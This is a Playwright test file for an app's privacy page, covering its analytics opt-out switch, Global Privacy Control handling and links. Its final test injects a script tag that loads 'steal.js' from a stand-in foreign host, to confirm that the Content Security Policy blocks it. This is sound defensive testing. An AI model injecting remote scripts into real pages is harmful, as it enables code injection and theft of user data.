// M1-13, the privacy page and analytics on the app (M-07, M-08): the page at
// /privacy with the eight points of plans/architecture.md §7, readable signed
// out; its analytics switch; the links to it from the notice and from Your
// account; and the Content Security Policy, which blocks a script from
// another site. The notice itself, Turn off, and the privacy signals are in
// analytics.spec.ts (M-08).

import AxeBuilder from "@axe-core/playwright";
import type { Browser, Page } from "@playwright/test";
import { TEST_POSTHOG, expect, test } from "./support/board.ts";

const SECTIONS = ["What we collect", "Who sees what", "Who processes it for us", "Cookies and analytics", "How long we keep it", "Your choices", "Children", "Changes to this page", "Questions"];

/** A browser session nobody is signed in to, at the same service as the board's. */
async function signedOut(browser: Browser, origin: string, path: string): Promise<Page> {
  const context = await browser.newContext({ baseURL: origin });
  const page = await context.newPage();
  await page.goto(path);
  return page;
}

const switchState = (page: Page) => page.locator("#sm-analytics-state");
/** The page's own switch, not the notice's. */
const pageSwitch = (page: Page, name: "Turn on" | "Turn off") => page.locator("main").getByRole("button", { name });

test("M-07 The privacy page is readable signed out, dated, and covers the eight points", async ({ board, browser }) => {
  const origin = new URL((await board.open("jordan_w")).url()).origin;
  const page = await signedOut(browser, origin, "/privacy");

  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Privacy");
  await expect(page.getByText(/^Updated \w+ \d{1,2}, \d{4}$/)).toBeVisible();
  expect(await page.getByRole("heading", { level: 2 }).allTextContents()).toEqual(SECTIONS);
  for (const named of ["Google Cloud", "PostHog", "Resend", "Google Fonts"]) await expect(page.locator("main")).toContainText(named);
  await expect(page.locator("main")).toContainText("Steelman isn’t for children under 13.");
  await expect(page.locator("main")).toContainText("Something deleted stays in a backup until it expires");
  await expect(page.locator("main")).toContainText("A deleted account’s username: held for 30 days");
  await expect(page.locator("main")).toContainText("hides what you type and your email");
  const results = await new AxeBuilder({ page }).analyze();
  expect(results.violations.map((v) => `${v.id}: ${v.nodes.map((n) => n.target.join(" ")).join(", ")}`)).toEqual([]);
});

test("M-07 Your account links to the privacy page, and keeps your username and email out of replays", async ({ board }) => {
  const page = await board.open("omar_h");
  await page.getByRole("link", { name: "Your account" }).click();
  await expect(page.locator(".sm-rrow", { hasText: "Username" }).locator(".sm-rrow-value")).toHaveClass(/ph-no-capture/);
  await page.getByRole("region", { name: "Your account" }).getByRole("link", { name: "Read" }).click();

  await expect(page).toHaveURL("/privacy");
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Privacy");
});

test("M-08 With no PostHog key, the page says analytics aren't running and offers no switch", async ({ board }) => {
  const page = await board.open("jordan_w");
  await page.goto("/privacy");

  await expect(switchState(page)).toHaveText("Usage analytics aren’t running here.");
  await expect(page.getByRole("button", { name: /Turn (on|off)/ })).toHaveCount(0);
});

test.describe("with a PostHog key", () => {
  test.use({ analytics: true });
  // Stands in for PostHog's script, so nothing reaches PostHog.
  const quietPostHog = (context: import("@playwright/test").BrowserContext) => context.route(`${TEST_POSTHOG.host}/**`, (route) => route.fulfill({ contentType: "text/javascript", body: "" }));

  test("M-08 The notice's Privacy link opens the privacy page", async ({ board }) => {
    const page = await board.open("maya.chen", { prepare: quietPostHog });

    await page.getByRole("region", { name: "Analytics" }).getByRole("link", { name: "Privacy" }).click();
    await expect(page).toHaveURL("/privacy");
    await expect(page.getByRole("heading", { level: 1 })).toHaveText("Privacy");
  });

  test("M-08 The privacy page turns analytics off and on in this browser, and the notice goes", async ({ board }) => {
    const page = await board.open("maya.chen", { prepare: quietPostHog });
    await page.goto("/privacy");

    await expect(switchState(page)).toHaveText("Usage analytics are on in this browser.");
    await pageSwitch(page, "Turn off").click();
    await expect(switchState(page)).toHaveText("Usage analytics are off in this browser.");
    expect(await page.evaluate(() => localStorage.getItem("steelman-analytics"))).toBe("off");
    await expect(page.getByRole("region", { name: "Analytics" })).toHaveCount(0);

    await pageSwitch(page, "Turn on").click();
    await expect(switchState(page)).toHaveText("Usage analytics are on in this browser.");
    expect(await page.evaluate(() => localStorage.getItem("steelman-analytics"))).toBe("on");
  });

  test("M-08 Turn on, after analytics were turned off on an earlier page, loads PostHog and tells it to opt in again", async ({ board }) => {
    // Notes every call the app makes to PostHog, as analytics.spec.ts's recorder does.
    const recorder = `(() => { const queued = window.posthog; const calls = (window.__posthogCalls = []); for (const call of queued) calls.push(call);
      window.posthog = new Proxy({ __loaded: true }, { get: (target, name) => (name in target ? target[name] : (...args) => void calls.push([name, ...args])) }); })();`;
    const page = await board.open("maya.chen", {
      prepare: async (context) => {
        await context.route(`${TEST_POSTHOG.host}/**`, (route) => route.fulfill({ contentType: "text/javascript", body: recorder }));
        await context.addInitScript(() => localStorage.setItem("steelman-analytics", "off"));
      },
    });
    await page.goto("/privacy");
    await expect(switchState(page)).toHaveText("Usage analytics are off in this browser.");

    await pageSwitch(page, "Turn on").click();
    await page.waitForFunction(() => Array.isArray((window as unknown as { __posthogCalls?: unknown[] }).__posthogCalls));
    const names = await page.evaluate(() => ((window as unknown as { __posthogCalls: unknown[][] }).__posthogCalls ?? []).map((call) => call[0]));
    expect(names).toContain("opt_in_capturing");
    expect(names).toContain("startSessionRecording");
  });

  test("M-08 With Global Privacy Control, the page says the browser asked, and offers no switch", async ({ board }) => {
    const page = await board.open("maya.chen", {
      prepare: async (context) => {
        await quietPostHog(context);
        await context.addInitScript(() => Object.defineProperty(Navigator.prototype, "globalPrivacyControl", { get: () => true }));
      },
    });
    await page.goto("/privacy");

    await expect(switchState(page)).toHaveText("Usage analytics are off: your browser asks not to be tracked.");
    await expect(page.getByRole("button", { name: /Turn (on|off)/ })).toHaveCount(0);
  });
});

test("M-07 The Content Security Policy blocks a script from another site", async ({ board, browser }) => {
  const origin = new URL((await board.open("jordan_w")).url()).origin;
  // A session of its own: the blocked script is reported as a console error, which the board's sessions treat as a failure.
  const page = await signedOut(browser, origin, "/privacy");
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Privacy");

  const blocked = await page.evaluate(
    () =>
      new Promise<string>((resolve) => {
        document.addEventListener("securitypolicyviolation", (event) => resolve(`${event.effectiveDirective} ${event.blockedURI}`), { once: true });
        const script = document.createElement("script");
        script.src = "https://elsewhere.invalid/steal.js";
        document.head.append(script);
      }),
  );
  expect(blocked).toBe("script-src-elem https://elsewhere.invalid/steal.js");
});
